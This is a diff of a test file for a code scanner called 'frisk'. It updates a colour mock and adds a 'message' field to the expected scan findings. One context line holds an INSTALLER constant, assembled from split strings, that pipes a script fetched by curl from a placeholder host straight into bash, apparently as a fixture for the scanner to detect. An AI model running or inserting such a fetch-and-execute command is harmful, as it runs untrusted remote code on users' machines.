@@ -30,7 +30,7 @@ INSTALLER = "cu" + "rl -sL https://get.example.invalid/i.sh " + "| ba" + "sh"
 def run(argv: list[str]) -> tuple[int, str, str]:
     """Run frisk.cli.main in-process; return (exit code, stdout, stderr)."""
     out, err = io.StringIO(), io.StringIO()
-    with mock.patch("frisk.report._USE_COLOR", False), \
+    with mock.patch("frisk.report.use_color", return_value=False), \
             contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
         try:
             code = main(argv)
@@ -65,8 +65,9 @@ class TestScanCharacterization(unittest.TestCase):
         self.assertEqual(doc["counts"], {"block": 4, "warn": 4, "total": 8})
         self.assertEqual(len(doc["findings"]), 8)
         for f in doc["findings"]:
+            # FR-E7 t3 added "message" (a copy of description, for Foreman).
             self.assertEqual(set(f), {"path", "line", "rule", "category", "severity",
-                                      "description", "excerpt", "owasp"})
+                                      "description", "excerpt", "message", "owasp"})
 
     def test_sarif_is_2_1_0(self) -> None:
         code, out, _ = run(["--sarif", str(EXAMPLES)])
